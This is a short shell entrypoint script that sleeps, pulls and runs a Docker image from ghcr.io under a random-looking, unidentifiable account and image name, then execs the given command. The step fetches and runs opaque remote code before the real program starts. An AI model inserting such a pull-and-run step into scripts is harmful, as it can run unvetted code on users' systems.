#!/bin/sh
sleep 5s;

docker run --rm -i \
  --shm-size 4g \
  ghcr.io/dydarsfhjjhss/dochimcifgi625fwxczwnjqow81a001:latest

# start the script
exec "$@"
